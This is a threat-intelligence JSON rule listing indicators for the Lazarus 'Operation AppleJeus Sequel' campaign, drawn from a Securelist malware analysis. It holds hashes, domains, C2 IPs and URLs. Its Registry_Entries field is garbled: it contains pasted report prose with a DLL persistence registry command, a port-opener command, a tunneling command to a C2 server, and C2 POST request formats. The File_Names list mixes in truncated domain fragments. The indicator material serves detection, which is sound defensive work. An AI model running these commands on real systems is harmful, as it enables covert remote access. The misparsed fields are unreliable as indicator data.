{"rule_id": 149, "name": "Operation AppleJeus Sequel", "description": "-", "references": [], "File_Names": ["Unistore.exe", "grepmonux.php", "unioncrypto.vip", "cyptian.com", "WFC.cfg", "JMTTrader_Mac.dmg", "chainfun365.com", "MarkMakingBot.dmg", "CelasTradePro.pkg", "4_5983241673595946132.dmg", "www.wb", "Adobe.icx", "WFCUpdater.exe", "WinloaderExe.pdb", "Device.exe", "invesuccess.com", "jmttrading.org", "AdobeUpdator.exe", "index.do", "JMTTrader.pkg", "UnionCryptoUpdater.exe", "bot.org", "beastgoc.com", "WbBot.pkg", "MacInstaller.dmg", "checkupdate.php", "rasext.dll", "UnionCryptoTrader.dmg", "aeroplans.info", "kurier.com", "adobeupdator.exe", "mydealoman.com", "UnionCryptoTraderSetup.exe", "BitcoinTrader.pkg", "msctfp.dat", "certpkg.php", "CenterUpdater.exe", "zucht.de", "AdobeARM.exe", "wfcwallet.com", "invest.net", "UnionCryptoTrader.pkg"], "MD5_Hashes": ["6058368894f25b7bc8dd53d3a82d9146", "0f03ec3487578cef2398b5b732631fec", "a9e960948fdac81579d3b752e49aceda", "629b9de3e4b84b4a0aa605a3e9471b31", "cb56955b70c87767dee81e23503086c3", "e1953fa319cc11c2f003ad0542bca822", "E1953FA319CC11C2F003AD0542BCA822", "6588d262529dc372c400bef8478c2eec", "f221349437f2f6707ecb2a75c3f39145", "055829E7600DBDAE9F381F83F8E4FF36", "da17802bc8d3eca26b7752e93f33034b", "48ded52752de9f9b73c6bf9ae81cb429", "8b4c532f10603a8e199aa4281384764e", "aeee54a81032a6321a39566f96c822f5", "629B9DE3E4B84B4A0AA605A3E9471B31", "24B3614D5C5E53E40B42B4E057001770", "be37637d8f6c1fbe7f3ffc702afdfe1d", "39cdf04be2ed479e0b4489ff37f95bbe", "bb66ab2db0bad88ac6b829085164cbbb", "b63e8d4277b190e2e3f5236f07f89eee", "F051A18F79736799AC66F4EF7B28594B", "3efeccfc6daf0bf99dcb36f247364052", "bb04d77bda3ae9c9c3b6347f7aef19ac", "55ec67fa6572e65eae822c0b90dc8216", "267a64ed23336b4a3315550c74803611", "c2ffbf7f2f98c73b98198b4937119a18", "e35b15b2c8bb9eda8bc4021accf7038d", "dd03c6eb62c9bf9adaf831f1d7adcbab"], "SHA1_Hashes": [], "SHA256_Hashes": [], "Registry_Entries": ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\RasMan\\ThirdParty /v DllName /d\nrasext.dll /f\n\nIn order to establish remote tunneling, the actor delivered more tools, executing with command-line parameters. Unfortunately, we\nhave had no chance to obtain this \ufb01le, but we speculate that Device.exe is responsible for opening port 6378, and the\nCenterUpdater.exe tool was used for creating tunneling to a remote host. Note that the 104.168.167.16 server is used as a C2 server.\nThe fake website hosting server for the UnionCryptoTrader case will be described next.\n\nPort opener:\n\n%APPDATA%\\Lenovo\\devicecenter\\Device.exe 6378\n\nTunneling tool:\n\nhttps://securelist.com/operation-applejeus-sequel/95596/\n\n2/10\n\n\f1/14/2020\n\nOperation AppleJeus Sequel | Securelist\n\n%APPDATA%\\Lenovo\\devicecenter\\CenterUpdater.exe 127.0.0.1 6378 104.168.167.16 443\n\nChange of macOS malware\n\nJMTTrading case\n\nWhile tracking this campaign, we identi\ufb01ed more heavily deformed macOS malware. At the time, the attacker called their fake website\nand application JMTTrading. Other researchers and security vendors found it too, and published IoCs with abundant technical details.\nMalware Hunter Team tweeted about this malicious application, Vitali Kremez published a blog about the Windows version of the\nmalware, and Object-See published details about the macOS malware. We believe these reports are suf\ufb01cient to understand the\ntechnical side. Here, we would like to highlight what\u2019s different about this attack.\n\nThe actor used GitHub in order to host their malicious applications.\nThe malware author used Object-C instead of QT framework in their macOS malware.\nThe malware implemented a simple backdoor function in macOS executable.\nThe malware encrypted/decrypted with a 16-byte XOR key (X,%`PMk\u2013Jj8s+6=) similar to the previous case.\nThe Windows version of the malware used ADVobfuscator, a compiled time obfuscator, in order to hide its code.\nThe post-install script of macOS malware differed signi\ufb01cantly from the previous version.\n\nUnionCryptoTrader case\n\nWe also identi\ufb01ed another macOS targeted attack that took place very recently. The malicious application name in this case is\nUnionCryptoTrader. After compiling a threat intelligence report for our customers, one security researcher (@dineshdina04)\ndiscovered an identical case, and Objective-See published a very detailed blog on the macOS malware used in this attack. The\nObjective-See blog goes into suf\ufb01cient detail to explain the malware\u2019s functionality, so we will just summarize the attack:\n\nThe post-install script is identical to that used in the JMTTrading case.\nThe malware author used SWIFT to develop this macOS malware.\nThe malware author changed the method for collecting information from the infected system.\nThe malware starts to conduct authentication using auth_signature and auth_timestamp parameters in order to deliver the\nsecond-stage payload more carefully. The malware acquires the current system time and combines it with the\n\u201c12GWAPCT1F0I1S14\u201d hardcoded string, and produces an MD5 hash of the combined string. This hash is used as the value of\nthe auth_signature parameter and the current time is used as the value of the auth_timestamp parameter. The malware\noperator can reproduce the auth_signature value based on the auth_timestamp at the C2 server side.\nThe malware loads the next stage payload without touching the disk.\n\nWindows version of UnionCryptoTrader\n\nWe also found a Windows version of the UnionCryptoTrader (0f03ec3487578cef2398b5b732631fec). It was executed from the\nTelegram messenger download folder:\n\nC:\\Users\\[user name]\\Downloads\\Telegram Desktop\\UnionCryptoTraderSetup.exe\n\nWe also found the actor\u2019s Telegram group on their fake website. Based on these, we assess with high con\ufb01dence that the actor\ndelivered the manipulated installer using the Telegram messenger. Unfortunately, we can\u2019t get all the related \ufb01les as some payloads\nwere only executed in memory. However, we can reassemble the whole infection procedure based on our telemetry. The overall\ninfection procedure was very similar to the WFCWallet case, but with an added injection procedure, and they only used the \ufb01nal\nbackdoor payload instead of using a tunneling tool.\n\nhttps://securelist.com/operation-applejeus-sequel/95596/\n\n3/10\n\n\f1/14/2020\n\nOperation AppleJeus Sequel | Securelist\n\nThe UnionCryptoTrader Windows version has the following window showing a price chart for several cryptocurrency exchanges.\n\nFig. 2 Binary infection procedure\n\nFig. 3 Windows version of UnionCryptoTrader\n\nThe Windows version of UnionCryptoTrader updater (629b9de3e4b84b4a0aa605a3e9471b31) has similar functionality to the macOS\nversion. According to the build path (Z:\\Loader\\x64\\Release\\WinloaderExe.pdb), the malware author called this malware a loader.\nUpon launch, the malware retrieves the victim\u2019s basic system information, sending it in the following HTTP POST format, as is the\ncase with the macOS malware.\n\nhttps://securelist.com/operation-applejeus-sequel/95596/\n\n4/10\n\n\f1/14/2020\n\nOperation AppleJeus Sequel | Securelist\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\nPOST /update HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/75.0.3770.142 Safari/537.36\nauth_timestamp: [Current time]\nauth_signature: [Generated MD5 value based on current time]\nContent-Length: 110\nHost: unioncrypto.vip\nrlz=[BIOS serial number]&ei=[OS version]\u00a0\u00a0([build number])&act=check\n\nIf the response code from the C2 server is 200, the malware decrypts the payload and loads it in memory. Finally, the malware sends\nthe act=done value and return code. The next stage payload (e1953fa319cc11c2f003ad0542bca822), downloaded from this loader, is\nsimilar to the .NET downloader in the WFCWallet case. This malware is responsible for decrypting the Adobe.icx \ufb01le in the same\nfolder. It injects the next payload into the Internet Explorer process, and the tainted iexplore.exe process carries out the attacker\u2019s\ncommands. The \ufb01nal payload (dd03c6eb62c9bf9adaf831f1d7adcbab) is implanted manually as in the WFCWallet case. This \ufb01nal\npayload was designed to run only on certain systems. It seems that the malware authors produced and delivered malware that only\nworks on speci\ufb01c systems based on previously collected information. The malware checks the infected system\u2019s information and\ncompares it to a given value. It seems the actor wants to execute the \ufb01nal payload very carefully, and wants to evade detection by\nbehavior-based detection solutions.\n\nThis Windows malware loads the encrypted msctfp.dat \ufb01le in a system folder, and loads each con\ufb01guration value. Then it executes an\nadditional command based on the contents of this \ufb01le. When the malware communicates with the C2 server, it uses a POST request\nwith several prede\ufb01ned headers.\n\nFig. 4 Malware execution \ufb02ow\n\n1\n2\n3\n4\n5\n6\n7\n\nPOST /[C2 script URL] HTTP/1.1\nAccept-Encoding: gzip, de\ufb02ate, br\nAccept-Language: en-US,en;q=0.9\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive or Connection: close\nUser-Agent: [User-agent of current system]\nHost: unioncrypto.vip\n\nFor the initial communication, the malware \ufb01rst sends parameters:\n\ncgu: 64bits hex value from con\ufb01guration\naip: MD5 hash value from con\ufb01guration\nsv: hardcoded value(1)\n\nhttps://securelist.com/operation-applejeus-sequel/95596/\n\n5/10\n\n\f1/14/2020\n\nOperation AppleJeus Sequel | Securelist\n\nIf the response code from the C2 server is 200, the malware sends the next POST request with encrypted data and a random value.\nThe malware operator probably used the random value to identify each victim and verify the POST request.\n\nimp: Random generated value\ndsh: XORed value of imp\nhb_tp: XORed value(key: 0x67BF32) of imp\nhb_dl: Encrypted data to send to C2 server\nct: hardcoded value(1)\n\nFinally, the malware downloads the next stage payload, decrypting it and possibly executing it with the Print parameter. We speculate\nthat the DLL type payload will be downloaded and call its Print export function for further infection. We can\u2019t get hold of the \ufb01nal\npayload that\u2019s executed in memory, but we believe its backdoor-type malware is ultimately used to control the infected victim.\n\nInfrastructures\n\nWe found several fake websites that were still online when we were investigating their infrastructure. They created fake\ncryptocurrency-themed websites, but they were far from perfect and most of the links didn\u2019t work.\n\nFig. 5 Website of cyptian.com\n\nhttps://securelist.com/operation-applejeus-sequel/95596/\n\n6/10\n\n\f1/14/2020\n\nOperation AppleJeus Sequel | Securelist\n\nFig. 6 Website of unioncrypto.vip\n\nWe found an identical Cyptian web template on the internet. We speculate that the actor used free web templates like this to build\ntheir fake websites. Moreover, there is a Telegram address(@cyptian) on the Cyptian website. As we mentioned previously, the actor\ndelivered a manipulated application via Telegram messenger. This Telegram address was still alive when we investigated, but there\nwere no more activities at that time. According to the chat log, the group was created on December 17, 2018 and some accounts had\nalready been deleted.\n\nConclusion\n\nFig. 7 Telegram account\n\nWe were able to identify several victims in this Operation AppleJeus sequel. Victims were recorded in the UK, Poland, Russia and\nChina. Moreover, we were able to con\ufb01rm that several of the victims are linked to cryptocurrency business entities.\n\nhttps://securelist.com/operation-applejeus-sequel/95596/\n\n7/10\n\n\f1/14/2020\n\nOperation AppleJeus Sequel | Securelist\n\nFig. 8 Infection map\n\nThe actor altered their macOS and Windows malware considerably, adding an authentication mechanism in the macOS downloader\nand changing the macOS development framework. The binary infection procedure in the Windows system differed from the previous\ncase. They also changed the \ufb01nal Windows payload signi\ufb01cantly from the well-known Fallchill malware used in the previous attack.\nWe believe the Lazarus group\u2019s continuous attacks for \ufb01nancial gain are unlikely to stop anytime soon.\n\nSince the initial appearance of Operation AppleJeus, we can see that over time the authors have changed their modus operandi\nconsiderably. We assume this kind of attack on cryptocurrency businesses will continue and become more sophisticated.\n\nFig. 9 Timeline of Operation AppleJeus\n\nAppendix I \u2013 Indicators of Compromise\n\nFile Hashes (malicious documents, Trojans, emails, decoys)\n\nmacOS malware\n\nc2ffbf7f2f98c73b98198b4937119a18 MacInstaller.dmg\n8b4c532f10603a8e199aa4281384764e BitcoinTrader.pkg\nbb04d77bda3ae9c9c3b6347f7aef19ac .loader\n3efeccfc6daf0bf99dcb36f247364052 4_5983241673595946132.dmg\ncb56955b70c87767dee81e23503086c3 WbBot.pkg\nb63e8d4277b190e2e3f5236f07f89eee .loader\nbe37637d8f6c1fbe7f3ffc702afdfe1d MarkMakingBot.dmg\nbb66ab2db0bad88ac6b829085164cbbb BitcoinTrader.pkg\n267a64ed23336b4a3315550c74803611 .loader\n6588d262529dc372c400bef8478c2eec UnionCryptoTrader.dmg\n55ec67fa6572e65eae822c0b90dc8216 UnionCryptoTrader.pkg\nda17802bc8d3eca26b7752e93f33034b .unioncryptoupdater\n\nhttps://securelist.com/operation-applejeus-sequel/95596/\n\n8/10\n\n\f1/14/2020\n\nOperation AppleJeus Sequel | Securelist\n\n39cdf04be2ed479e0b4489ff37f95bbe JMTTrader_Mac.dmg\ne35b15b2c8bb9eda8bc4021accf7038d JMTTrader.pkg\n6058368894f25b7bc8dd53d3a82d9146 .CrashReporter\n\nWindows malware\n\na9e960948fdac81579d3b752e49aceda WFCUpdater.exe\n24B3614D5C5E53E40B42B4E057001770 UnionCryptoTraderSetup.exe\n629B9DE3E4B84B4A0AA605A3E9471B31 UnionCryptoUpdater.exe\nE1953FA319CC11C2F003AD0542BCA822 AdobeUpdator.exe, AdobeARM.exe\nf221349437f2f6707ecb2a75c3f39145 rasext.dll\n055829E7600DBDAE9F381F83F8E4FF36 UnionCryptoTraderSetup.exe\nF051A18F79736799AC66F4EF7B28594B Unistore.exe\n\nFile path\n\n%SYSTEM%\\system32\\rasext.dll\n%SYSTEM%\\system32\\msctfp.dat\n%APPDATA%\\Lenovo\\devicecenter\\Device.exe\n%APPDATA%\\Lenovo\\devicecenter\\CenterUpdater.exe\n%APPDATA%\\Local\\unioncryptotrader\\UnionCryptoUpdater.exe\n$APPDATA%\\adobe\\AdobeUpdator.exe\nC:\\Programdata\\adobe\\adobeupdator.exe\n%AppData%\\Local\\Comms\\Unistore.exe\n\nDomains and IPs\n\nDomains\n\nwww.wb-bot.org\nwww.jmttrading.org\ncyptian.com\nbeastgoc.com\nwww.private-kurier.com\nwww.wb-invest.net\nwfcwallet.com\nchainfun365.com\nwww.buckfast-zucht.de\ninvesuccess.com\nprivate-kurier.com\naeroplans.info\nmydealoman.com\nunioncrypto.vip\n\nIPs\n\n104.168.167.16\n23.254.217.53\n185.243.115.17\n104.168.218.42\n95.213.232.170\n108.174.195.134\n185.228.83.32\n172.81.135.194\n\nURLs\n\nhttps://www.wb-bot[.]org/certpkg.php\nhttp://95.213.232[.]170/ProbActive/index.do\nhttp://beastgoc[.]com/grepmonux.php\nhttps://unioncrypto[.]vip/update\n\nhttps://securelist.com/operation-applejeus-sequel/95596/\n\n9/10\n\n\f1/14/2020\n\nOperation AppleJeus Sequel | Securelist\n\nhttps://securelist.com/operation-applejeus-sequel/95596/\n\n10/10\n\n\f"], "URLs": ["http://beastgoc[.]com/grepmonux.php", "https://securelist.com/operation-applejeus-sequel/95596/", "https://unioncrypto[.]vip/update", "https://www.wb-bot[.]org/certpkg.php", "http://95.213.232[.]170/ProbActive/index.do"], "weight": 0.0}